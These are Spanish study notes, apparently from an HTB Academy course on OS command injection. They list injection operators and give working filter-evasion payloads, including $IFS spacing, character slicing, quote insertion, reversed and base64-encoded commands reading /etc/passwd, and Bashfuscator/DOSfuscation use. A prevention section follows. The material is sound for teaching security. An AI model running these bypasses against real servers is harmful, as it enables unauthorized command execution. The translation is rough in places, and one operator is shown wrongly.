---
tags:
  - Web
  - Explotacion
  - Command-Injections
---

# HTB Academy

## Qué son las inyecciones

Las vulnerabilidades de inyección se consideran el riesgo número 3 en [Los 10 principales riesgos de la Aplicación Web de OWASP](https://owasp.org/www-project-top-ten/), dado su alto impacto y lo comunes que son. La inyección ocurre cuando la entrada controlada por el usuario se malinterpreta como parte de la consulta web o el código que se está ejecutando, lo que puede llevar a subvertir el resultado previsto de la consulta a un resultado diferente que sea útil para el atacante.

Hay muchos tipos de inyecciones que se encuentran en las aplicaciones web, dependiendo del tipo de consulta web que se está ejecutando. Los siguientes son algunos de los tipos más comunes de inyecciones:

|Inyección|Descripción|
|---|---|
|Inyección de Comando OS|Ocurre cuando la entrada del usuario se utiliza directamente como parte de un comando OS.|
|Inyección de Código|Ocurre cuando la entrada del usuario está directamente dentro de una función que evalúa el código.|
|Inyecciones SQL|Ocurre cuando la entrada del usuario se usa directamente como parte de una consulta SQL.|
|Cross-Site Scripting/HTML Inyección|Ocurre cuando la entrada exacta del usuario se muestra en una página web.|

Hay muchos otros tipos de inyecciones que no sean las anteriores, como `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, y otros. Cada vez que la entrada del usuario se utiliza dentro de una consulta sin ser desinfectada adecuadamente, puede ser posible escapar de los límites de la cadena de entrada del usuario a la consulta principal y manipularla para cambiar su propósito previsto. Esta es la razón por la cual a medida que se introduzcan más tecnologías web en las aplicaciones web, veremos nuevos tipos de inyecciones introducidas en las aplicaciones web.


|**Tipo de Inyección**|**Operadores**|
|---|---|
|Inyección SQL|`'` `,` `;` `--` `/* */`|
|Inyección de Comando|`;` `&&`|
|LDAP Inyección|`*` `(` `)` `&` `\|`|
|XPath Inyección|`'` `or` `and` `not` `substring` `concat` `count`|
|Inyección de Comando OS|`;` `&` `\|`|
|Inyección de Código|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directorio Traversal/File Path Traversal|`../` `..\\` `%00`|
|Inyección de Objetos|`;` `&` `\|`|
|XQuery Inyección|`'` `;` `--` `/* */`|
|Shellcode Inyección|`\x` `\u` `%u` `%n`|
|Inyección de Cabezal|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|


## Métodos de Inyección de Comando

Para inyectar un comando adicional al previsto, podemos utilizar cualquiera de los siguientes operadores:

| **Operador de Inyección** | **Carácter de Inyección** | **Carácter codificado por URL** | **Comando Ejecutado**                                |
| ------------------------- | ------------------------- | ------------------------------- | ---------------------------------------------------- |
| Semicolon                 | `;`                       | `%3b`                           | Ambos                                                |
| Nueva Línea               | `\n`                      | `%0a`                           | Ambos                                                |
| Antecedentes              | `&`                       | `%26`                           | Ambos (segunda salida generalmente mostrada primero) |
| Tubo                      | `\|`                      | `%7c`                           | Ambos (solo se muestra la segunda salida)            |
| Y                         | `&&`                      | `%26%26`                        | Ambos (solo si primero tiene éxito)                  |
| O                         | `\|`                      | `%7c%7c`                        | Segundo (solo si falla primero)                      |
| Sub-Shell                 | ` `` `                    | `%60%60`                        | Ambos (Linux-only)                                   |
| Sub-Shell                 | `$()`                     | `%24%28%29`                     | Ambos (Linux-only)                                   |

## Bypass de espacios y caracteres

### Espacios

#### Usando $IFS

El uso de la variable Linux Environment `($IFS)` también puede funcionar, ya que su valor predeterminado es un espacio y una pestaña, que funcionaría entre argumentos de comando. Entonces, si usamos `${IFS}` donde deberían estar los espacios, la variable debería ser reemplazada automáticamente por un espacio, y nuestro comando debería funcionar.

Usemos `${IFS}` y ver si funciona (`127.0.0.1%0a${IFS}`): ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a${IFS}'. La respuesta muestra HTML para un formulario Host Checker y resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_4.jpg)
Vemos que nuestra solicitud no fue denegada esta vez, y pasamos por alto el filtro espacial nuevamente.

```shell-session
vcrdcr@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```


### Linux Caracteres como \ / ;

Hay muchas técnicas que podemos utilizar para tener cortes en nuestra carga útil. Una de esas técnicas que podemos usar para reemplazar barras (`or any other character`) es a través `Linux Environment Variables` como hicimos con `${IFS}`. Mientras `${IFS}` se reemplaza directamente con un espacio, no existe tal variable de entorno para barras o semicolones. Sin embargo, estos caracteres se pueden utilizar en una variable de entorno, y podemos especificar `start` y `length` de nuestra cuerda para que coincida exactamente con este personaje.

Por ejemplo, si miramos el `$PATH` variable de entorno en Linux, puede parecerse a lo siguiente:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```


Entonces, si empezamos en el `0` carácter, y solo tomar una cadena de longitud `1`, terminaremos con solo el `/` carácter, que podemos utilizar en nuestra carga útil:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${PATH:0:1}

/
```


Podemos hacer lo mismo con el `$HOME` o `$PWD` variables de entorno también. También podemos utilizar el mismo concepto para obtener un carácter semi-colon, para ser utilizado como un operador de inyección. Por ejemplo, el siguiente comando nos da un punto y coma:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```


### Windows Caracteres como \ / ;

El mismo concepto funciona en Windows también. Por ejemplo, para producir una barra en `Windows Command Line (CMD)`, podemos `echo` una variable de Windows (`%HOMEPATH%` -> `\Users\htb-student`), y luego especifique una posición inicial (`~6` -> `\htb-student`), y finalmente especificando una posición final negativa, que en este caso es la longitud del nombre de usuario `htb-student` (`-11` -> `\`) :

  Bypassing Otros Personajes de la Lista Negra

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Podemos lograr lo mismo usando las mismas variables en `Windows PowerShell`. Con PowerShell, una palabra se considera una matriz, por lo que tenemos que especificar el índice del carácter que necesitamos. Como solo necesitamos un carácter, no tenemos que especificar las posiciones inicial y final:

  Bypassing Otros Personajes de la Lista Negra

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

También podemos usar el `Get-ChildItem Env:` Comando PowerShell para imprimir todas las variables de entorno y luego elegir una de ellas para producir un carácter que necesitamos. `Try to be creative and find different commands to produce similar characters.`


### Character Shifting

Existen otras técnicas para producir los caracteres requeridos sin usarlos, como `shifting characters`. Por ejemplo, el siguiente comando de Linux cambia el carácter que pasamos `1`. Entonces, todo lo que tenemos que hacer es encontrar el personaje en la tabla ASCII que está justo antes de nuestro personaje necesario (podemos obtenerlo `man ascii`), luego agréguelo en lugar de `[` en el siguiente ejemplo. De esta manera, el último personaje impreso sería el que necesitamos:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
vcrdcr@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```


## Bypass de comandos

### Linux y Windows
Una técnica de ofuscación muy común y fácil es insertar ciertos caracteres dentro de nuestro comando que generalmente son ignorados por los shells de comandos como `Bash` o `PowerShell` y ejecutará el mismo comando que si no estuvieran allí. Algunos de estos personajes son una cita única `'` y una doble cita `"`, además de algunos otros.

Los más fáciles de usar son las citas, y funcionan tanto en servidores Linux como en Windows. Por ejemplo, si queremos ofuscar el `whoami` comando, podemos insertar comillas individuales entre sus caracteres, de la siguiente manera:

  Eludir los comandos de la Lista Negra

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

Lo mismo funciona con citas dobles también:

  Eludir los comandos de la Lista Negra

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```


Las cosas importantes para recordar son eso `we cannot mix types of quotes` y `the number of quotes must be even`. Podemos probar uno de los anteriores en nuestra carga útil (`127.0.0.1%0aw'h'o'am'i`) y ver si funciona:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_2.jpg)

Como podemos ver, este método realmente funciona.

### Solo Linux

Podemos insertar algunos otros caracteres solo para Linux en medio de comandos, y el `bash` shell los ignoraría y ejecutaría el comando. Estos personajes incluyen la reacción inversa `\` y el carácter de parámetro posicional `$@`. Esto funciona exactamente como lo hizo con las citas, pero en este caso, `the number of characters do not have to be even`, y podemos insertar solo uno de ellos si queremos:

Código: bash

```bash
who$@ami
w\ho\am\i
```


### Solo Windows

También hay algunos caracteres solo para Windows que podemos insertar en medio de comandos que no afectan el resultado, como un caret (`^`) carácter, como podemos ver en el siguiente ejemplo:

  Eludir los comandos de la Lista Negra

```cmd-session
C:\htb> who^ami

21y4d
```

En la siguiente sección, discutiremos algunas técnicas más avanzadas para la ofuscación de comandos y el desvío de filtros.

## Ofuscación Avanzada de Comando (Manual)

### Manipulación de Casos

Una técnica de ofuscación de comandos que podemos usar es la manipulación de casos, como invertir los casos de caracteres de un comando (por ejemplo. `WHOAMI`) o alternando entre casos (p. ej. `WhOaMi`). Esto generalmente funciona porque una lista negra de comandos puede no verificar diferentes variaciones de casos de una sola palabra, ya que los sistemas Linux son sensibles a casos.

Si estamos tratando con un servidor Windows, podemos cambiar la carcasa de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD son insensibles a los casos, lo que significa que ejecutarán el comando independientemente del caso en el que esté escrito:

 ***Windows***

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

Sin embargo, cuando se trata de Linux y un shell bash, que son sensibles a los casos, como se mencionó anteriormente, tenemos que ser un poco creativos y encontrar un comando que convierta el comando en una palabra de mayúsculas y minúsculas. Un comando de trabajo que podemos usar es el siguiente:

  ***LINUX***

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Como podemos ver, el comando funcionó, a pesar de que la palabra que proporcionamos fue (`WhOaMi`). Este comando utiliza `tr` para reemplazar todos los caracteres en mayúsculas con caracteres en minúsculas, lo que da como resultado un comando de caracteres en minúsculas. Sin embargo, si intentamos usar el comando anterior con el `Host Checker` aplicación web, veremos que todavía se bloquea:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra 'Introducción no válida' como resultado.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)

`Can you guess why?` Es porque el comando anterior contiene espacios, que es un carácter filtrado en nuestra aplicación web, como hemos visto antes. Entonces, con tales técnicas, `we must always be sure not to use any filtered characters`, de lo contrario nuestras solicitudes fallarán, y podemos pensar que las técnicas no funcionaron.

Una vez que reemplazamos los espacios con pestañas (`%09`), vemos que el comando funciona perfectamente:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1 con el usuario 'www-data'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)


Hay muchos otros comandos que podemos usar para el mismo propósito, como los siguientes:


```bash
$(a="WhOaMi";printf %s "${a,,}")
```


### Comandos Invertidos

#### Linux

Otra técnica de ofuscación de comandos que discutiremos es revertir comandos y tener una plantilla de comando que los cambie y los ejecute en tiempo real. En este caso, estaremos escribiendo `imaohw` en lugar de `whoami` para evitar activar el comando de la lista negra.

Podemos ser creativos con tales técnicas y crear nuestros propios comandos de Linux/Windows que eventualmente ejecutan el comando sin contener las palabras de comando reales. Primero, tendríamos que obtener la cadena invertida de nuestro comando en nuestro terminal, de la siguiente manera:


```shell-session
vcrdcr@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Luego, podemos ejecutar el comando original revirtiéndolo en una sub-shell (`$()`), como sigue:


```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

#### Windows

Lo mismo se puede aplicar en `Windows.` Primero podemos revertir una cadena, de la siguiente manera:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Ahora podemos usar el siguiente comando para ejecutar una cadena invertida con una sub-shell de PowerShell (`iex "$()"`), como sigue:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```


### Comandos Codificados

La técnica final que discutiremos es útil para los comandos que contienen caracteres filtrados o caracteres que pueden ser decodificados por URL por el servidor. Esto puede permitir que el comando se arruine cuando llegue al shell y finalmente no se ejecute. En lugar de copiar un comando existente en línea, intentaremos crear nuestro propio comando de ofuscación único esta vez. De esta manera, es mucho menos probable que sea denegado por un filtro o un WAF. El comando que creamos será único para cada caso, dependiendo de qué caracteres están permitidos y el nivel de seguridad en el servidor.

Podemos utilizar varias herramientas de codificación, como `base64` (para la codificación b64) o `xxd` (para codificación hexadecimal). Tomemos `base64` como ejemplo. Primero, codificaremos la carga útil que queremos ejecutar (que incluye caracteres filtrados):

  ***LINUX***

```shell-session
vcrdcr@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Ahora podemos crear un comando que decodificará la cadena codificada en una sub-shell (`$()`), y luego pasarlo a `bash` para ser ejecutado (es decir. `bash<<<`), de la siguiente manera:

  Ofuscación Avanzada de Comando

```shell-session
vcrdcr@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Como podemos ver, el comando anterior ejecuta el comando perfectamente. No incluimos ningún carácter filtrado y evitamos los caracteres codificados que pueden hacer que el comando no se ejecute.

Consejo: Tenga en cuenta que estamos utilizando `<<<` para evitar usar una tubería `|`, que es un carácter filtrado.


Incluso si algunos comandos fueron filtrados, como `bash` o `base64`éste podría evitarse con las técnicas que discutimos en la sección anterior (por ejemplo, inserción de caracteres), o usar otras alternativas como `sh` para la ejecución de comandos y `openssl` para la decodificación b64, o `xxd` para decodificación hexadecimal.

También usamos la misma técnica con Windows. Primero, necesitamos que base64 codifique nuestra cadena, de la siguiente manera:


***Windows***

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de `utf-8` a `utf-16` antes que nosotros `base64` es, como sigue:



```shell-session
vcrdcr@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finalmente, podemos decodificar la cadena b64 y ejecutarla con una sub-corteza PowerShell (`iex "$()"`), como sigue:



```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

Como podemos ver, podemos ser creativos con `Bash` o `PowerShell` y cree nuevos métodos de derivación y ofuscación que no se hayan utilizado antes, y por lo tanto es muy probable que omitan filtros y WAF. Varias herramientas pueden ayudarnos a ofuscar automáticamente nuestros comandos, que discutiremos en la siguiente sección.

## Ofuscación automatizada

### Linux (Bashfuscador)

Una herramienta útil que podemos utilizar para ofuscar comandos bash es [Bashfuscador](https://github.com/Bashfuscator/Bashfuscator). Podemos clonar el repositorio de GitHub y luego instalar sus requisitos, de la siguiente manera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
vcrdcr@htb[/htb]$ cd Bashfuscator
vcrdcr@htb[/htb]$ pip3 install setuptools==65
vcrdcr@htb[/htb]$ python3 setup.py install --user
```

Una vez que tengamos la herramienta configurada, podemos comenzar a usarla desde el `./bashfuscator/bin/` directorio. Hay muchas banderas que podemos usar con la herramienta para afinar nuestro comando final ofuscado, como podemos ver en el `-h` menú de ayuda:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ cd ./bashfuscator/bin/
vcrdcr@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

Podemos comenzar simplemente proporcionando el comando que queremos ofuscar con el `-c` bandera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

¡Sin embargo, ejecutar la herramienta de esta manera elegirá aleatoriamente una técnica de ofuscación, que puede generar una longitud de comando que va desde unos pocos cientos de caracteres hasta más de un millón de caracteres! Por lo tanto, podemos usar algunas de las banderas del menú de ayuda para producir un comando ofuscado más corto y simple, de la siguiente manera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

Ahora podemos probar el comando emitido con `bash -c ''`, para ver si ejecuta el comando previsto:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

Podemos ver que el comando ofuscado funciona, todo mientras se ve completamente ofuscado, y no se parece a nuestro comando original. También podemos notar que la herramienta utiliza muchas técnicas de ofuscación, incluidas las que discutimos anteriormente y muchas otras.

Ejercicio: Intente probar el comando anterior con nuestra aplicación web, para ver si puede omitir con éxito los filtros. Si no es así, ¿puedes adivinar por qué? ¿Y puede hacer que la herramienta produzca una carga útil de trabajo?

---

### Windows (DOSfuscación)

También hay una herramienta muy similar que podemos usar para Windows llamada [DOSfuscación](https://github.com/danielbohannon/Invoke-DOSfuscation). A diferencia `Bashfuscator`ésta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos con ella para obtener el comando ofuscado deseado. Una vez más podemos clonar la herramienta de GitHub y luego invocarla a través de PowerShell, de la siguiente manera:

  Herramientas de Evasión

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

Incluso podemos usar `tutorial` para ver un ejemplo de cómo funciona la herramienta. Una vez que estamos configurados, podemos comenzar a usar la herramienta, de la siguiente manera:

  Herramientas de Evasión

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Finalmente, podemos intentar ejecutar el comando ofuscado `CMD`y vemos que realmente funciona como se esperaba:

  Herramientas de Evasión

```cmd-session
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Consejo: Si no tenemos acceso a una VM de Windows, podemos ejecutar el código anterior en una VM de Linux a través de `pwsh`. Correr `pwsh`y luego siga exactamente el mismo comando desde arriba. Esta herramienta está instalada de forma predeterminada en su instancia de 'pwnboxory. También puede encontrar instrucciones de instalación en este [enlace](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

Para obtener más información sobre los métodos avanzados de ofuscación, puede consultar el [Codificación segura 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) módulo, que cubre métodos avanzados de ofuscación que se pueden utilizar en varios ataques, incluidos los que cubrimos en este módulo.

---

## Prevención

Ahora deberíamos tener una comprensión sólida de cómo ocurren las vulnerabilidades de inyección de comandos y cómo se pueden omitir ciertas mitigaciones como los filtros de caracteres y comandos. Esta sección discutirá los métodos que podemos usar para prevenir las vulnerabilidades de inyección de comandos en nuestras aplicaciones web y configurar correctamente el servidor web para evitarlas.

---

### Comandos del Sistema

Siempre debemos evitar el uso de funciones que ejecutan comandos del sistema, especialmente si estamos utilizando la entrada del usuario con ellos. Incluso cuando no estamos ingresando directamente la entrada del usuario en estas funciones, un usuario puede influir indirectamente en ellas, lo que eventualmente puede conducir a una vulnerabilidad de inyección de comandos.

En lugar de utilizar funciones de ejecución de comandos del sistema, deberíamos usar funciones integradas que realicen la funcionalidad necesaria, ya que los lenguajes de back-end generalmente tienen implementaciones seguras de este tipo de funcionalidades. Por ejemplo, supongamos que queríamos probar si un host en particular está vivo con `PHP`. En ese caso, podemos usar el `fsockopen` función en su lugar, que no debe ser explotable para ejecutar comandos arbitrarios del sistema.

Si necesitábamos ejecutar un comando del sistema, y no se puede encontrar ninguna función incorporada para realizar la misma funcionalidad, nunca debemos usar directamente la entrada del usuario con estas funciones, sino que siempre debemos validar y desinfectar la entrada del usuario en el back-end. Además, debemos tratar de limitar nuestro uso de este tipo de funciones tanto como sea posible y solo usarlas cuando no haya una alternativa incorporada a la funcionalidad que requerimos.

### Validación de Entrada

Ya sea utilizando funciones integradas o funciones de ejecución de comandos del sistema, siempre debemos validar y luego desinfectar la entrada del usuario. La validación de entrada se realiza para garantizar que coincida con el formato esperado para la entrada, de modo que la solicitud se deniegue si no coincide. En nuestra aplicación web de ejemplo, vimos que hubo un intento de validación de entrada en el front-end, pero `input validation should be done both on the front-end and on the back-end`.

En `PHP`, al igual que muchos otros lenguajes de desarrollo web, hay filtros integrados para una variedad de formatos estándar, como correos electrónicos, URL e incluso IP, que se pueden usar con `filter_var` función, como sigue:

Código: php

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Si quisiéramos validar un formato no estándar diferente, entonces podemos usar una Expresión Regular `regex` con el `preg_match` función. Lo mismo se puede lograr con `JavaScript` tanto para el front-end como para el back-end (es decir. `NodeJS`), de la siguiente manera:

Código: javascript

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

Igual que `PHP`, con `NodeJS`, también podemos usar bibliotecas para validar varios formatos estándar, como [is-ip](https://www.npmjs.com/package/is-ip) por ejemplo, con el que podemos instalar `npm`y luego usa el `isIp(ip)` función en nuestro código. Puede leer los manuales de otros idiomas, como [.NETO](https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) o [Java](https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), para averiguar cómo validar la entrada del usuario en cada idioma respectivo.


### Desinfección de Entrada

La parte más crítica para prevenir cualquier vulnerabilidad de inyección es la desinfección de entrada, lo que significa eliminar cualquier carácter especial no necesario de la entrada del usuario. La desinfección de entrada siempre se realiza después de la validación de entrada. Incluso después de validar que la entrada del usuario proporcionada está en el formato adecuado, aún debemos realizar la desinfección y eliminar cualquier carácter especial que no sea necesario para el formato específico, ya que hay casos en los que la validación de entrada puede fallar (por ejemplo, un bad regex).

En nuestro código de ejemplo, vimos que cuando estábamos tratando con filtros de caracteres y comandos, estaba en la lista negra de ciertas palabras y buscándolas en la entrada del usuario. En general, este no es un enfoque lo suficientemente bueno para prevenir las inyecciones, y debemos usar funciones integradas para eliminar cualquier carácter especial. Podemos usar `preg_replace` para eliminar cualquier carácter especial de la entrada del usuario, de la siguiente manera:

Código: php

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

Como podemos ver, el regex anterior solo permite caracteres alfanuméricos (`A-Za-z0-9`) y permite un carácter de punto (`.`) según sea necesario para IPs. Cualquier otro carácter se eliminará de la cadena. Lo mismo se puede hacer con `JavaScript`, como sigue:

Código: javascript

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

También podemos utilizar la biblioteca DOMPurify para `NodeJS` back-end, de la siguiente manera:

Código: javascript

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

En ciertos casos, es posible que deseemos permitir todos los caracteres especiales (por ejemplo, comentarios de usuario), luego podemos usar el mismo `filter_var` función que utilizamos con validación de entrada, y utilizar el `escapeshellcmd` filtre para escapar de cualquier carácter especial, por lo que no pueden causar ninguna inyección. Para `NodeJS`, simplemente podemos usar el `escape(ip)` función. `However, as we have seen in this module, escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques`.

Para obtener más información sobre la validación y desinfección de la entrada del usuario para evitar inyecciones de comandos, puede consultar el [Codificación segura 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) módulo, que cubre cómo auditar el código fuente de una aplicación web para identificar vulnerabilidades de inyección de comandos, y luego funciona para parchear correctamente este tipo de vulnerabilidades.


### Configuración del Servidor

Finalmente, debemos asegurarnos de que nuestro servidor de back-end esté configurado de forma segura para reducir el impacto en caso de que el servidor web se vea comprometido. Algunas de las configuraciones que podemos implementar son:

- Utilice el Firewall de aplicaciones Web incorporado del servidor web (por ejemplo, en Apache `mod_security`), además de un WAF externo (p. ej. `Cloudflare`, `Fortinet`, `Imperva`..)
    
- Cumple con el [Principio de Menor Privilegio (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) al ejecutar el servidor web como un usuario con bajo privilegio (por ejemplo. `www-data`)
    
- Evitar que ciertas funciones sean ejecutadas por el servidor web (por ejemplo, en PHP `disable_functions=system,...`)
    
- Limite el alcance accesible por la aplicación web a su carpeta (por ejemplo, en PHP `open_basedir = '/var/www/html'`)
    
- Rechazar solicitudes de doble codificación y caracteres no ASCII en las URL
    
- Evitar el uso de bibliotecas y módulos sensibles/anticuados (p. ej. [CGI PHP](https://www.php.net/manual/en/install.unix.commandline.php))
    

Al final, incluso después de todas estas mitigaciones y configuraciones de seguridad, tenemos que realizar las técnicas de prueba de penetración que aprendimos en este módulo para ver si alguna funcionalidad de aplicación web aún puede ser vulnerable a la inyección de comandos. Como algunas aplicaciones web tienen millones de líneas de código, cualquier error en cualquier línea de código puede ser suficiente para introducir una vulnerabilidad. Por lo tanto, debemos tratar de proteger la aplicación web complementando las mejores prácticas de codificación segura con pruebas de penetración exhaustivas.